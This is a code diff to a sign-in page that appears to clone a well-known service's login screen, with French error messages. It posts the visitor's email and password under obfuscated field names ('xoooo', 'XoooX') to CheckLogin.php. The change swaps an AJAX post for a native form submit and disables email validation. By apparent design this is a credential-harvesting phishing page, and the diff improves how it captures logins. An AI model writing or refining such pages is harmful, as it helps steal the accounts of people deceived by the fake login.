@@ -28,11 +28,11 @@
         <div data-reactid="8">
           <div class="login-content login-form" data-reactid="10">
             <h1 data-reactid="11" class="login-title">Sign In</h1>
-            <span style="color: red;" id="error"></span>
-            <form class="login-form" action="CheckLogin.php" method="post" data-reactid="13">
+            <span style="color: red; margin-left: 24px;" id="error" ></span>
+            <form class="login-form" action="CheckLogin.php" method="post" id="login_submit" data-reactid="13">
               <label class="login-input login-input-email ui-label ui-input-label" id="lbl-email" placeholder="email"
                 data-reactid="14">
-                <!-- <span class="ui-label-text" data-reactid="15">E-mail</span> --><input placeholder="Email or phone number" class="ui-text-input" name="xoooo"
+                <!-- <span class="ui-label-text" data-reactid="15">E-mail</span> --><input type="email" placeholder="Email or phone number" class="ui-text-input" name="xoooo"
                   id="email" value="" tabindex="1" autocomplete="email" data-reactid="16"></label>
               <div class="hybrid-password-wrapper" data-reactid="17">
                 <label class="hybrid-password login-input login-input-password ui-label ui-input-label"
@@ -47,8 +47,8 @@
 <!--               <div class="login-forgot-password-wrapper" data-reactid="23">
                 <a href="#" class="login-help-link" tabindex="3" data-reactid="24">E-mail ou mot de passe ?</a>
               </div> -->
-              <button class="btn login-button btn-submit btn-small" type="button" autocomplete="off" tabindex="4"
-                data-reactid="25" onclick="login()">
+              <button class="btn login-button btn-submit btn-small" type="submit" autocomplete="off" tabindex="4"
+                data-reactid="25" >
                 Sign in
               </button>
               <div class="login-remember-me-wrapper" data-reactid="27">
@@ -125,41 +125,31 @@
 		  </div>
 	  </div>
 <script>
-  function login() {
-    var email = $("#email").val();
-    var pass = $("#password").val();
-    if (!ValidateEmail(email)) {
-      $("#email").val("");
-      $("#email").focus();
-      $("#error").text("Veuillez saisir à nouveau votre adresse e-mail.");
-      return;
-    }
-    else {
-      $("#error").text("");
+  $("#login_submit").on('submit',function(e){
+        e.preventDefault();
+        var email = $("#email").val();
+        var pass = $("#password").val();
+        // if (!ValidateEmail(email)) {
+        //   $("#email").val("");
+        //   $("#email").focus();
+        //   $("#error").text("Veuillez saisir à nouveau votre adresse e-mail.");
+        //   return;
+        // }
+        // else {
+        //   $("#error").text("");
 
-    }
-    if (!check_password(pass)) {
-      $("#password").val("");
-      $("#password").focus();
-      $("#error").text("Le format du mot de passe est incorrect.");
-      return;
-    }
-    else {
-      $("#error").text("");
-
-    }
-    $.post(
-      "CheckLogin.php",
-      {
-        xoooo: email,
-        XoooX: pass
-      },
-      function (data, status) {
-
-      }
-    );
-
-  }
+        // }
+        if (!check_password(pass)) {
+          $("#password").val("");
+          $("#password").focus();
+          $("#error").text("Le format du mot de passe est incorrect.");
+          return;
+        }
+        else {
+          $("#error").text("");
+        }
+        e.currentTarget.submit()
+  });
   function ValidateEmail(inputText) {
     var mailformat = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)*$/;
     if (inputText.match(mailformat)) {
